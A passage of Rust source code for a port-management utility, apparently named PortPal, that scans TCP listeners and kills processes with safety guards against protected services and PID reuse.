// `parse_port` serves the Unix scanner and the test helpers; the Windows
// scanner parses whole rows through `parse_netstat_tcp_row` instead.
#[cfg(target_os = "windows")]
use crate::netaddr::parse_netstat_tcp_row;
#[cfg(any(target_os = "macos", target_os = "linux", test))]
use crate::netaddr::parse_port;
use crate::taxonomy::{is_protected_process_name, CRITICAL_PORTS};
use serde::Serialize;
use std::collections::{HashMap, HashSet};
use std::io;
use std::path::{Path, PathBuf};
use std::process::{Child, Command};
use std::sync::{LazyLock, Mutex};
use std::time::{Duration, Instant};
use sysinfo::System;
#[cfg(target_os = "windows")]
use windows_sys::Win32::Foundation::{CloseHandle, ERROR_ACCESS_DENIED, HANDLE, WAIT_OBJECT_0};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Threading::{
    OpenProcess, TerminateProcess, WaitForSingleObject, PROCESS_TERMINATE,
};

/// `SYNCHRONIZE` (0x0010_0000) is a standard access right, but `windows-sys`
/// only re-exports it typed as a file access right, so it is spelled out here
/// rather than imported from `Storage::FileSystem` where it would read as a file
/// flag at the call site.
#[cfg(target_os = "windows")]
const SYNCHRONIZE: u32 = 0x0010_0000;

#[derive(Serialize, Clone)]
pub struct PortInfo {
    pub port: u16,
    pub pid: u32,
    pub process_name: String,
    pub project_path: Option<String>,
    pub project_name: Option<String>,
    /// Always `"TCP"`. PortPal scans TCP listeners only; see the scope note on
    /// [`try_scan_ports`]. The field is carried through so the UI can label
    /// every row honestly rather than leaving the protocol implicit.
    pub protocol: String,
    /// Display only: never parse or execute this joined command line.
    pub start_cmd: Option<String>,
    pub cwd: Option<String>,
}

// ─── Entry point (platform router) ───────────────────────────────────────────

/// Why a scan could not be completed. Serialized to the webview so the UI can
/// show a specific degraded state instead of an empty port list.
#[derive(Debug, Serialize, Clone, PartialEq)]
pub struct ScanError {
    /// `tool_missing` | `tool_failed` | `tool_unreadable`
    pub code: &'static str,
    /// The external tool the platform scanner depends on.
    pub tool: &'static str,
    pub message: String,
}

impl ScanError {
    fn new(code: &'static str, tool: &'static str, message: impl Into<String>) -> Self {
        Self {
            code,
            tool,
            message: message.into(),
        }
    }

    /// The scan never ran because the background worker itself failed, which
    /// is a different failure from the scan tool being unusable.
    pub(crate) fn worker_failed(message: impl Into<String>) -> Self {
        Self::new("worker_failed", "", message)
    }
}

impl std::fmt::Display for ScanError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.message)
    }
}

/// Resolves an OS utility to a stable, trusted path before spawning it.
/// Windows utilities are pinned to System32. Unix uses conventional system
/// locations first and validates PATH fallbacks before accepting them.
pub(crate) fn resolve_external_tool(tool: &'static str) -> io::Result<PathBuf> {
    #[cfg(target_os = "windows")]
    {
        let root = std::env::var_os("SystemRoot")
            .or_else(|| std::env::var_os("WINDIR"))
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "SystemRoot is not set"))?;
        let candidate = PathBuf::from(root)
            .join("System32")
            .join(format!("{tool}.exe"));
        return if is_safe_external_tool_path(&candidate) {
            candidate.canonicalize()
        } else {
            Err(io::Error::new(
                io::ErrorKind::NotFound,
                format!("{tool} is unavailable"),
            ))
        };
    }

    #[cfg(unix)]
    {
        let system_candidates: &[&str] = match tool {
            "lsof" => &["/usr/sbin/lsof", "/usr/bin/lsof"],
            "ss" => &["/usr/bin/ss", "/usr/sbin/ss"],
            _ => &[],
        };
        for candidate in system_candidates.iter().map(Path::new) {
            if is_safe_external_tool_path(candidate) {
                return candidate.canonicalize();
            }
        }
        if let Some(path) = std::env::var_os("PATH") {
            for directory in std::env::split_paths(&path) {
                let candidate = directory.join(tool);
                if is_safe_external_tool_path(&candidate) {
                    return candidate.canonicalize();
                }
            }
        }
        Err(io::Error::new(
            io::ErrorKind::NotFound,
            format!("{tool} is unavailable"),
        ))
    }
}

fn is_safe_external_tool_path(path: &Path) -> bool {
    let Ok(metadata) = std::fs::metadata(path) else {
        return false;
    };
    if !metadata.is_file() {
        return false;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let Some(parent) = path.parent().and_then(|p| p.canonicalize().ok()) else {
            return false;
        };
        let Ok(parent_metadata) = std::fs::metadata(parent) else {
            return false;
        };
        let mode = metadata.permissions().mode() | parent_metadata.permissions().mode();
        mode & 0o022 == 0
    }
    #[cfg(not(unix))]
    {
        true
    }
}

/// Runs an external network tool and returns its stdout.
///
/// `purpose` completes the sentence "PortPal needs it to …" in the error
/// message, because the tools do not all serve the same capability: on Linux
/// `lsof` lists listeners while `ss` reads connections, so a failure has to say
/// which of the two broke rather than blame port scanning for either.
///
/// Every failure is reported as a typed error rather than a panic: a missing
/// binary, a sandbox denial, and a non-zero exit are all recoverable states
/// that must degrade to a visible warning, never terminate the app or the
/// background tray thread.
pub(crate) fn run_scan_tool(
    tool: &'static str,
    args: &[&str],
    purpose: &'static str,
) -> Result<String, ScanError> {
    let executable = resolve_external_tool(tool).map_err(|e| {
        if e.kind() == std::io::ErrorKind::NotFound {
            ScanError::new(
                "tool_missing",
                tool,
                format!("`{tool}` was not found on PATH. PortPal needs it to {purpose}."),
            )
        } else {
            ScanError::new(
                "tool_failed",
                tool,
                format!("`{tool}` could not be started: {e}. It may be blocked by sandboxing or permissions."),
            )
        }
    })?;
    let output = Command::new(executable).args(args).output().map_err(|e| {
        ScanError::new("tool_failed", tool,
            format!("`{tool}` could not be started: {e}. It may be blocked by sandboxing or permissions."))
    })?;

    // A tool that ran but failed leaves stdout empty. Reporting that as "no
    // ports are listening" would be a silent lie, so it is an error too.
    if !output.status.success() {
        let detail = String::from_utf8_lossy(&output.stderr).trim().to_string();
        let detail = if detail.is_empty() {
            format!("exited with {}", output.status)
        } else {
            detail
        };
        return Err(ScanError::new(
            "tool_failed",
            tool,
            format!("`{tool}` failed: {detail}"),
        ));
    }

    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

/// The external tool this platform lists TCP listeners with, paired with the
/// exact args the row parser expects.
///
/// One definition so the startup preflight cannot drift from what the scan
/// actually spawns. It is deliberately *not* the whole dependency set: reading
/// connections takes a second tool on Linux — see
/// [`crate::connections::connections_tool`].
pub(crate) fn listing_tool() -> (&'static str, &'static [&'static str]) {
    #[cfg(target_os = "windows")]
    return ("netstat", &["-ano"]);

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    return ("lsof", &["-iTCP", "-sTCP:LISTEN", "-n", "-P"]);
}

/// Verifies at startup that this platform's *listing* tool is actually usable,
/// so a missing dependency surfaces as a warning on launch instead of an empty
/// port list minutes later. Never panics; the caller decides how to report it.
///
/// This covers one capability only. `connections::preflight` checks the other,
/// and on Linux that is a different binary; `run()` calls both.
pub fn preflight() -> Result<(), ScanError> {
    try_scan_ports().map(|_| ())
}

/// Scans listening ports, or explains why it could not.
///
/// Callers must handle the error rather than substituting an empty list:
/// `Ok(vec![])` means "nothing is listening", which is a very different claim
/// from "the scan did not run", and the kill guards depend on the difference.
///
/// # Protocol scope: TCP only
///
/// Every row this returns is a TCP listener, and `PortInfo::protocol` is
/// always `"TCP"`. UDP is deliberately out of scope, not merely unimplemented:
/// UDP is connectionless, so there is no `LISTEN` state to filter on and no
/// way to tell a bound socket that serves requests from one a client opened to
/// send a datagram. `netstat -ano` and `lsof -iUDP` would both list those rows
/// indistinguishably, and PortPal's kill/restart affordances treat a row as an
/// owned service. Listing UDP would therefore add plausible-looking rows that
/// the rest of the app cannot reason about, so the scan states its TCP scope
/// instead of half-covering UDP. See `docs/scan-scope.md`.
pub fn try_scan_ports() -> Result<Vec<PortInfo>, ScanError> {
    let mut sys = System::new();
    sys.refresh_processes();

    // Rebuilt from scratch on every scan so stale (port, pid) pairs cannot be
    // restarted after the owning process is gone or the pid has been reused.
    let mut trusted: TrustedLaunches = HashMap::new();

    #[cfg(target_os = "windows")]
    let ports = scan_windows(&sys, &mut trusted)?;

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    let ports = scan_unix(&sys, &mut trusted)?;

    // Only replace the trusted store on a successful scan. A failed scan must
    // not erase records that restart still depends on.
    if let Ok(mut store) = trusted_launches().lock() {
        *store = trusted;
    }

    Ok(ports)
}

/// Fetches environment variables on-demand for a single PID.
///
/// Kept out of the 2s broadcast loop to prevent serializing large process environments
/// into every scan tick. Returns `Ok(None)` if access is restricted by OS security policy
/// (e.g. system services or processes running as another user).
pub fn get_process_env(pid: u32) -> Result<Option<HashMap<String, String>>, String> {
    if is_reserved_pid(pid) || pid > i32::MAX as u32 {
        return Ok(None);
    }

    let mut sys = System::new();
    sys.refresh_processes();

    let process = match sys.process(sysinfo::Pid::from(pid as usize)) {
        Some(p) => p,
        None => return Ok(None),
    };

    let environ = process.environ();
    if environ.is_empty() {
        // Either empty or restricted by OS
        return Ok(None);
    }

    let mut map = HashMap::new();
    for var in environ {
        if let Some((k, v)) = var.split_once('=') {
            map.insert(k.to_string(), v.to_string());
        }
    }

    if map.is_empty() {
        Ok(None)
    } else {
        Ok(Some(map))
    }
}

#[derive(Debug, Serialize)]
pub struct KillError {
    pub code: &'static str,
    pub message: String,
}

impl KillError {
    pub(crate) fn new(code: &'static str, message: impl Into<String>) -> Self {
        Self {
            code,
            message: message.into(),
        }
    }
}

/// The one definition of a reserved process ID, used by the kill guards.
///
/// PID 0 is not a real process and PID 1 is init/launchd/`wininit`; signalling
/// either is never something PortPal does. Reserved is a statement about what
/// may be *acted on*, not about what may be *shown* — see
/// [`is_unattributed_pid`] for the listing rule.
pub(crate) fn is_reserved_pid(pid: u32) -> bool {
    pid <= 1
}

/// The one definition of a PID that carries no process identity, shared by
/// both listing scanners and the connection parser.
///
/// PID 0 is the placeholder a scan tool prints for a socket it could not
/// attribute to a user process (System Idle on Windows, the swapper on Unix),
/// and the sentinel `lsof`/`ss` leave behind for a peer they did not name. It
/// is never a listener worth showing and never an identity worth matching, so
/// `connections` keeps that case as `None` rather than as a PID; see
/// `connections::Connection`.
///
/// PID 1 is deliberately *not* covered here. A systemd socket-activated
/// listener is genuinely bound even though PID 1 owns it, and hiding it would
/// make a real, occupied port vanish from the UI. Those rows are listed and
/// then protected at the point of action — [`is_reserved_pid`] rejects them in
/// `validate_kill`/`kill_pid`, and restart needs a trusted launch record PID 1
/// never has — the same visible-but-protected pattern as a critical service.
pub(crate) fn is_unattributed_pid(pid: u32) -> bool {
    pid == 0
}

fn validate_kill(
    pid: u32,
    ports: &[PortInfo],
    additional_critical_ports: &[u16],
) -> Result<(), KillError> {
    if is_reserved_pid(pid) || pid > i32::MAX as u32 {
        return Err(KillError::new(
            "invalid_pid",
            "Reserved or invalid process ID",
        ));
    }
    let listeners: Vec<_> = ports.iter().filter(|p| p.pid == pid).collect();
    if listeners.is_empty() {
        return Err(KillError::new(
            "not_observed",
            format!(
                "PID {pid} is not a currently observed listening process; rescan and try again"
            ),
        ));
    }
    for listener in listeners {
        if is_protected_process_name(&listener.process_name)
            || CRITICAL_PORTS.contains(&listener.port)
            || additional_critical_ports.contains(&listener.port)
        {
            return Err(KillError::new(
                "critical_process",
                format!(
                    "Protected service {} on :{} cannot be killed",
                    listener.process_name, listener.port
                ),
            ));
        }
    }
    Ok(())
}

pub fn kill_pid(pid: u32) -> Result<(), KillError> {
    // Reject process-group and reserved IDs before scanning or invoking an OS API.
    if is_reserved_pid(pid) || pid > i32::MAX as u32 {
        return Err(KillError::new(
            "invalid_pid",
            "Reserved or invalid process ID",
        ));
    }
    // Claim the process before anything below observes it; see `KillTarget`.
    let target = KillTarget::acquire(pid);
    // A scan that did not run cannot clear a kill: without a port list the
    // critical-process guard has nothing to check against, so fail closed with
    // the real reason instead of the misleading "not observed".
    let ports = try_scan_ports().map_err(|e| {
        KillError::new(
            "scan_failed",
            format!("Cannot verify what PID {pid} is listening on: {e}"),
        )
    })?;
    kill_pid_with(pid, &ports, target)
}

/// Kills a process after the caller has already captured a successful scan.
/// Keeping the snapshot at the operation boundary avoids rescanning the same
/// listener set when restart first verifies and then terminates a process.
///
/// `target` must have been acquired *before* that scan — see [`KillTarget`].
/// Taking it as an argument rather than claiming it here is what keeps that
/// ordering true for both callers: this function cannot know what its caller
/// already observed.
fn kill_pid_with(pid: u32, ports: &[PortInfo], target: KillTarget) -> Result<(), KillError> {
    // Unix has nothing to claim (see `KillTarget`); the parameter is still taken
    // so both platforms keep one shape and one ordering rule.
    #[cfg(not(target_os = "windows"))]
    let _ = &target;
    // Host configuration can add protection, never remove the defaults. No
    // override is exposed through the PID-only webview command.
    let additional = std::env::var("PORTPAL_CRITICAL_PORTS")
        .unwrap_or_default()
        .split(',')
        .filter_map(|port| port.trim().parse::<u16>().ok())
        .collect::<Vec<_>>();
    validate_kill(pid, &ports, &additional)?;
    let mut sys = System::new();
    sys.refresh_processes();
    let process = sys
        .process(sysinfo::Pid::from(pid as usize))
        .ok_or_else(|| {
            KillError::new("not_observed", "Process disappeared; rescan and try again")
        })?;
    if ports
        .iter()
        .filter(|p| p.pid == pid)
        .any(|p| p.process_name != process.name())
    {
        return Err(KillError::new(
            "process_changed",
            "Process identity changed; rescan and try again",
        ));
    }

    #[cfg(target_os = "windows")]
    return target
        .handle?
        .stop()
        .map_err(|e| KillError::new("os_error", e));

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    return kill_unix(pid).map_err(|e| KillError::new("os_error", e));
}

// ─── Windows ─────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn scan_windows(sys: &System, trusted: &mut TrustedLaunches) -> Result<Vec<PortInfo>, ScanError> {
    // TCP only, and locale-independent: `parse_netstat_tcp_row` matches the
    // Proto column (never translated) and identifies a listener by its null
    // Foreign Address rather than by the State text, which Windows translates.
    // Reading that text reported zero ports on every non-English install.
    // UDP rows carry no State column and are rejected. See the scope note on
    // `try_scan_ports`.
    let (tool, args) = listing_tool();
    let stdout = run_scan_tool(tool, args, "list listening ports")?;
    let mut ports: Vec<PortInfo> = Vec::new();
    let mut seen_entries: HashSet<(u16, u32)> = HashSet::new();

    for line in stdout.lines() {
        let Some(row) = parse_netstat_tcp_row(line) else {
            continue;
        };
        if !row.is_listener() {
            continue;
        }
        let (port, pid) = (row.local_port, row.pid);

        if is_unattributed_pid(pid) || seen_entries.contains(&(port, pid)) {
            continue;
        }
        seen_entries.insert((port, pid));

        let mut process_name = format!("PID {}", pid);
        let mut project_path = None;
        let mut start_cmd = None;
        let mut cwd_str = None;

        if let Some(process) = sys.process(sysinfo::Pid::from(pid as usize)) {
            let p_name = process.name().to_string();
            if !p_name.trim().is_empty() {
                process_name = p_name;
            }

            let cmd_arr = process.cmd();
            let cmd_str = cmd_arr.join(" ");

            if !cmd_str.trim().is_empty() {
                start_cmd = Some(cmd_str.trim().to_string());
            }

            if let Some(cwd) = process.cwd() {
                cwd_str = Some(cwd.to_string_lossy().to_string());
                project_path = find_project_root(cwd).map(|p| p.to_string_lossy().to_string());
            }

            if project_path.is_none() {
                if let Some(exe) = process.exe() {
                    if let Some(parent) = exe.parent() {
                        project_path =
                            find_project_root(parent).map(|p| p.to_string_lossy().to_string());
                    }
                }
            }

            if let Some(record) = build_launch_record(cmd_arr, process.cwd()) {
                trusted.insert((port, pid), record);
            }
        }

        let project_name = extract_project_name(&project_path);

        ports.push(PortInfo {
            port,
            pid,
            process_name,
            project_path,
            project_name,
            protocol: "TCP".into(),
            start_cmd,
            cwd: cwd_str,
        });
    }

    ports.sort_by_key(|p| p.port);
    Ok(ports)
}

/// The process a kill has claimed, acquired before anything observes it.
///
/// On Windows it carries the open handle that pins the PID (see
/// [`ProcessHandle`]); on Unix there is nothing equivalent to hold, so it
/// carries nothing and exists only to keep one shape for both platforms.
///
/// Acquiring it is deliberately the *first* thing a kill does, ahead of the scan
/// that validates the process: on Windows that ordering is what makes "the
/// process we validated" and "the process we terminated" the same process. A
/// handle opened afterwards would pin nothing that mattered.
struct KillTarget {
    #[cfg(target_os = "windows")]
    handle: Result<ProcessHandle, KillError>,
}

impl KillTarget {
    fn acquire(pid: u32) -> Self {
        #[cfg(target_os = "windows")]
        // The failure is carried, not returned: PortPal's own policy outranks
        // it. A protected service cannot be opened with PROCESS_TERMINATE
        // either, and answering that with "run as administrator" would invite
        // the user to elevate and retry a kill the policy refuses outright. It
        // surfaces only after `validate_kill` has had its say, and nothing is
        // terminated in between.
        return Self {
            handle: ProcessHandle::open(pid),
        };

        #[cfg(not(target_os = "windows"))]
        {
            // The PID is all the platform offers; `kill_unix` re-checks process
            // start time before the escalation instead. Closing the initial
            // signal's race needs pidfds, which macOS has no equivalent for.
            let _ = pid;
            Self {}
        }
    }
}

/// An open handle to the process PortPal is about to stop.
///
/// # Why a handle instead of a PID
///
/// The kill path used to validate a process and then shell out to
/// `taskkill /PID n /F`, which re-checks nothing: between the check and the
/// terminate the process could exit and Windows could hand the number to
/// something else, and the wrong process got force-killed. Windows keeps a
/// process ID reserved for as long as any handle to that process object is open,
/// so holding this handle pins the identity. `kill_pid` opens it *before* the
/// validating scan, which is the part that matters — every step after that acts
/// on one fixed process rather than on whatever owns the number by then.
///
/// # Scope: this process, not its descendants
///
/// Deliberately no `/T`-equivalent tree walk. The listener PortPal showed is the
/// process holding the port and the process the user selected; a tree kill would
/// reach processes that were never on screen — a blast radius the UI cannot
/// honestly show and the Unix path does not share. The cost is real and is
/// disclosed in the confirmation dialog: a child that inherited the listening
/// socket can keep the port bound, and a supervisor child can restart the
/// listener. See docs/kill-policy.md.
#[cfg(target_os = "windows")]
struct ProcessHandle {
    handle: HANDLE,
    pid: u32,
}

#[cfg(target_os = "windows")]
impl ProcessHandle {
    /// PROCESS_TERMINATE to stop it, SYNCHRONIZE to wait for it — nothing more.
    /// The handle never reads the process, so it does not ask for the right to.
    fn open(pid: u32) -> Result<Self, KillError> {
        // SAFETY: a well-formed kernel32 call. The returned handle is checked
        // for null below and closed exactly once, in `Drop`.
        let handle = unsafe { OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, 0, pid) };
        if handle.is_null() {
            let error = io::Error::last_os_error();
            // Access denied is a different user problem from a vanished process:
            // one means "run PortPal elevated", the other means "rescan".
            return Err(
                if error.raw_os_error() == Some(ERROR_ACCESS_DENIED as i32) {
                    KillError::new(
                    "access_denied",
                    format!("PID {pid} cannot be stopped by this user. Run PortPal as administrator to manage it."),
                )
                } else {
                    KillError::new(
                        "not_observed",
                        format!("PID {pid} is no longer running; rescan and try again"),
                    )
                },
            );
        }
        Ok(Self { handle, pid })
    }

    /// Asks the process to close, waits the shared grace period, then forces it.
    ///
    /// The mirror of `kill_unix`'s SIGTERM → wait → SIGKILL, which is the point:
    /// Windows is where PortPal is used most, and it was the platform that only
    /// ever force-killed while the dialog warned about unsaved data.
    fn stop(&self) -> Result<(), String> {
        // `taskkill` without `/F` posts WM_CLOSE to the process's own top-level
        // windows — a real graceful stop for anything with a window, and safe to
        // address by PID because this handle has pinned it.
        //
        // A windowless console server has no window to post to, and `taskkill`
        // reports that by failing; that is the signal to stop waiting and force
        // it. The obvious alternative, AttachConsole + GenerateConsoleCtrlEvent,
        // is deliberately not used: a console control event reaches every
        // process sharing that console, including the shell the user started the
        // server from, which widens the blast radius the way `/T` would.
        if self.request_close() && self.wait_for_exit(GRACEFUL_STOP_GRACE) {
            return Ok(());
        }
        self.terminate()
    }

    /// Posts WM_CLOSE through `taskkill` (no `/F`). True when Windows accepted
    /// it, which also means there was a window to accept it.
    fn request_close(&self) -> bool {
        let Ok(executable) = resolve_external_tool("taskkill") else {
            return false;
        };
        Command::new(executable)
            .args(["/PID", &self.pid.to_string()])
            .output()
            .map(|output| output.status.success())
            .unwrap_or(false)
    }

    /// True if the process has exited within `timeout`.
    fn wait_for_exit(&self, timeout: Duration) -> bool {
        let millis = u32::try_from(timeout.as_millis()).unwrap_or(u32::MAX);
        // SAFETY: `self.handle` is a live handle opened with SYNCHRONIZE.
        // Waiting on the process object returns the instant it exits, and cannot
        // be fooled by PID reuse the way a PID poll could.
        unsafe { WaitForSingleObject(self.handle, millis) == WAIT_OBJECT_0 }
    }

    /// Forces the process and returns only once it has actually exited.
    ///
    /// `TerminateProcess` merely *initiates* termination, so its success is not
    /// an exit: returning there would report "killed" while the process was
    /// still dying, and the UI would show a STOPPED row for a port that is still
    /// bound. The wait is what makes the claim true.
    ///
    /// It also collapses the already-exited case. `TerminateProcess` fails with
    /// access-denied on a process that has already terminated, which is not a
    /// failed kill — the wait below succeeds and the error is discarded.
    fn terminate(&self) -> Result<(), String> {
        // SAFETY: `self.handle` is a live handle opened with PROCESS_TERMINATE.
        let initiated = unsafe { TerminateProcess(self.handle, 1) } != 0;
        let error = (!initiated).then(io::Error::last_os_error);
        if self.wait_for_exit(GRACEFUL_STOP_GRACE) {
            return Ok(());
        }
        Err(match error {
            Some(error) => error.to_string(),
            None => format!("PID {} was terminated but has not exited yet", self.pid),
        })
    }
}

#[cfg(target_os = "windows")]
impl Drop for ProcessHandle {
    fn drop(&mut self) {
        // Closing the handle is what releases the PID reservation, so it happens
        // only once the kill has been decided, never earlier.
        // SAFETY: closing a handle this type owns, exactly once.
        unsafe { CloseHandle(self.handle) };
    }
}

// ─── macOS + Linux (shared lsof path) ────────────────────────────────────────

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn scan_unix(sys: &System, trusted: &mut TrustedLaunches) -> Result<Vec<PortInfo>, ScanError> {
    // TCP only, by the `-iTCP -sTCP:LISTEN` selectors: UDP has no LISTEN state
    // to select on. See the scope note on `try_scan_ports`.
    let (tool, args) = listing_tool();
    let stdout = run_scan_tool(tool, args, "list listening ports")?;
    let mut ports: Vec<PortInfo> = Vec::new();
    let mut seen_entries: HashSet<(u16, u32)> = HashSet::new();
    // PIDs whose working directory `sysinfo` could not supply, resolved in one
    // batch after the loop.
    let mut needs_cwd: Vec<u32> = Vec::new();

    for line in stdout.lines().skip(1) {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 9 {
            continue;
        }

        let mut process_name = parts[0].to_string();
        let pid: u32 = match parts[1].parse() {
            Ok(p) => p,
            Err(_) => continue,
        };

        let mut idx = parts.len() - 1;
        if parts[idx].starts_with('(') {
            idx -= 1;
        }
        let name = parts[idx];
        let port: u16 = match parse_port(name) {
            Some(p) => p,
            None => continue,
        };

        // Same listing policy as the Windows scan: only PID 0 is dropped, and
        // only because it names no process. A PID 1 listener (systemd socket
        // activation) is a real bound port and stays visible; the kill guards
        // refuse it, they do not hide it.
        if is_unattributed_pid(pid) || seen_entries.contains(&(port, pid)) {
            continue;
        }
        seen_entries.insert((port, pid));

        let mut project_path = None;
        let mut start_cmd = None;
        let mut cwd_str = None;

        if let Some(process) = sys.process(sysinfo::Pid::from(pid as usize)) {
            let sys_name = process.name().to_string();
            if !sys_name.is_empty() {
                process_name = sys_name;
            }

            if let Some(cwd) = process.cwd() {
                cwd_str = Some(cwd.to_string_lossy().to_string());
                project_path = find_project_root(cwd).map(|p| p.to_string_lossy().to_string());
            }

            let cmd = process.cmd().join(" ");
            if !cmd.trim().is_empty() {
                start_cmd = Some(cmd);
            }

            if let Some(record) = build_launch_record(process.cmd(), process.cwd()) {
                trusted.insert((port, pid), record);
            }
        }

        // Note the gap rather than filling it here: resolving a cwd used to
        // cost a process spawn per row on macOS, inside this loop, on a 2s
        // timer. They are resolved together after the loop instead.
        if project_path.is_none() {
            needs_cwd.push(pid);
        }

        ports.push(PortInfo {
            port,
            pid,
            process_name,
            project_path,
            // Derived from project_path once the batch below has had its say.
            project_name: None,
            protocol: "TCP".into(),
            start_cmd,
            cwd: cwd_str,
        });
    }

    // One resolution pass for every row `sysinfo` could not place.
    if !needs_cwd.is_empty() {
        needs_cwd.sort_unstable();
        needs_cwd.dedup();
        let cwds = resolve_cwds(&needs_cwd);
        for port in ports.iter_mut().filter(|p| p.project_path.is_none()) {
            if let Some(cwd) = cwds.get(&port.pid) {
                if port.cwd.is_none() {
                    port.cwd = Some(cwd.to_string_lossy().to_string());
                }
                // `find_project_root` is memoized, so listeners sharing a
                // project directory probe the filesystem only once.
                port.project_path = find_project_root(cwd).map(|p| p.to_string_lossy().to_string());
            }
        }
    }

    for port in &mut ports {
        port.project_name = extract_project_name(&port.project_path);
    }

    ports.sort_by_key(|p| p.port);
    Ok(ports)
}

/// Resolves working directories for the `pids` `sysinfo` could not place.
///
/// One call for the whole scan, not one per process. On Linux this is a
/// `/proc/<pid>/cwd` readlink per pid, which spawns nothing. macOS has no
/// `/proc`, so it is a single `lsof` covering every pid at once — the previous
/// code ran one `lsof` per pid from inside the scan's row loop, so a Mac with
/// 30-80 listeners paid that many process spawns every two seconds.
///
/// A pid missing from the returned map simply has no project attributed to it,
/// which is the same outcome the per-pid version produced on failure.
#[cfg(any(target_os = "macos", target_os = "linux"))]
fn resolve_cwds(pids: &[u32]) -> HashMap<u32, PathBuf> {
    if pids.is_empty() {
        return HashMap::new();
    }

    #[cfg(target_os = "linux")]
    {
        let mut out = HashMap::with_capacity(pids.len());
        for &pid in pids {
            if let Ok(cwd) = std::fs::read_link(format!("/proc/{}/cwd", pid)) {
                out.insert(pid, cwd);
            }
        }
        out
    }

    #[cfg(target_os = "macos")]
    {
        // `-p` takes a comma-separated set, so the whole scan is one spawn.
        let list = pids
            .iter()
            .map(u32::to_string)
            .collect::<Vec<_>>()
            .join(",");
        match resolve_external_tool("lsof").and_then(|executable| {
            Command::new(executable)
                .args(["-p", &list, "-a", "-d", "cwd", "-Fpn"])
                .output()
        }) {
            // A non-zero exit still prints the pids it could read, and lsof
            // exits non-zero whenever any pid was unreadable, so stdout is
            // parsed either way rather than discarded.
            Ok(output) => parse_lsof_cwd_records(&String::from_utf8_lossy(&output.stdout)),
            Err(_) => HashMap::new(),
        }
    }
}

/// Parses `lsof -Fpn` output into a pid to working-directory map.
///
/// In `-F` output every line is one field, identified by its first character:
/// `p` opens a process block and `n` names a file in it. Because `-d cwd`
/// selects exactly one descriptor per process, the `n` line that follows a `p`
/// line belongs to that pid.
///
/// Kept free of platform APIs and compiled under `cfg(test)` so it is covered
/// on any host, including the Windows machines where the Unix scanner around it
/// never compiles at all. Linux is deliberately excluded: `resolve_cwds` reads
/// `/proc` there and never calls this, so compiling it would be dead code.
#[cfg(any(target_os = "macos", test))]
fn parse_lsof_cwd_records(stdout: &str) -> HashMap<u32, PathBuf> {
    let mut out = HashMap::new();
    let mut current: Option<u32> = None;
    for line in stdout.lines() {
        let mut chars = line.chars();
        let Some(tag) = chars.next() else { continue };
        let rest = chars.as_str();
        match tag {
            // An unparseable pid clears the block so its path is not
            // misattributed to whichever process was named before it.
            'p' => current = rest.parse().ok(),
            'n' if !rest.is_empty() => {
                if let Some(pid) = current {
                    out.insert(pid, PathBuf::from(rest));
                }
            }
            _ => {}
        }
    }
    out
}

/// How long a process gets to exit on its own after being asked to stop, before
/// PortPal forces it: SIGTERM then SIGKILL on Unix, WM_CLOSE then
/// `TerminateProcess` on Windows. One constant, so the grace a user is promised
/// cannot drift between the two platforms.
const GRACEFUL_STOP_GRACE: Duration = Duration::from_secs(2);

/// How long to wait for a killed process to release its socket before the
/// replacement is spawned; binding again too early fails with EADDRINUSE.
const RESTART_SETTLE: Duration = Duration::from_millis(800);

/// Polling interval for the waits above. Short enough that the common case —
/// a dev server that exits almost immediately — is not billed the full grace
/// period, long enough not to spin.
const EXIT_POLL_INTERVAL: Duration = Duration::from_millis(25);

/// Waits up to `timeout` for `finished` to report true.
///
/// Replaces the fixed sleeps these paths used to take. The old code always
/// paid the entire grace period even when the process was gone in
/// milliseconds, which is what made kill feel like a hang and made Kill All
/// take the grace period once per process.
fn wait_until(timeout: Duration, mut finished: impl FnMut() -> bool) -> bool {
    let deadline = Instant::now() + timeout;
    loop {
        if finished() {
            return true;
        }
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            return false;
        }
        std::thread::sleep(EXIT_POLL_INTERVAL.min(remaining));
    }
}

/// Cheap liveness probe suitable for polling in a loop, unlike a full scan.
fn process_has_exited(sys: &mut System, pid: u32) -> bool {
    !sys.refresh_process(sysinfo::Pid::from(pid as usize))
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn kill_unix(pid: u32) -> Result<(), String> {
    let mut sys = System::new();
    sys.refresh_processes();
    let identity = sys
        .process(sysinfo::Pid::from(pid as usize))
        .map(|p| p.start_time())
        .ok_or_else(|| "Process disappeared".to_string())?;
    if unsafe { libc::kill(pid as i32, libc::SIGTERM) } != 0 {
        return Err(std::io::Error::last_os_error().to_string());
    }
    // Return as soon as the process is actually gone. Escalation still happens
    // only after the full grace period has elapsed without an exit.
    let exited = wait_until(GRACEFUL_STOP_GRACE, || !process_exists_unix(pid));

    if !exited {
        // Never send the delayed SIGKILL to a process that reused the PID.
        sys.refresh_processes();
        if sys
            .process(sysinfo::Pid::from(pid as usize))
            .map(|p| p.start_time())
            != Some(identity)
        {
            return Err("Process identity changed before SIGKILL".into());
        }
        if unsafe { libc::kill(pid as i32, libc::SIGKILL) } != 0 {
            return Err(std::io::Error::last_os_error().to_string());
        }
    }
    Ok(())
}

#[cfg(any(target_os = "macos", target_os = "linux"))]
fn process_exists_unix(pid: u32) -> bool {
    // First, try to reap our own child if it's a zombie. `waitpid(WNOHANG)`
    // returns the pid if the child has exited (reaping it), 0 if still running,
    // or -1 if we're not the parent.
    let mut status: libc::c_int = 0;
    let ret = unsafe { libc::waitpid(pid as i32, &mut status, libc::WNOHANG) };
    if ret == pid as i32 {
        // Child was a zombie; now reaped. It's gone.
        return false;
    }
    // ret == 0 means it's our child and still running → exists.
    // ret == -1 means we're not the parent → fall through to kill(0) probe.

    if unsafe { libc::kill(pid as i32, 0) } != 0 {
        return false; // process doesn't exist at all
    }

    // kill(0) succeeds for zombies too. On Linux, check /proc/<pid>/stat to
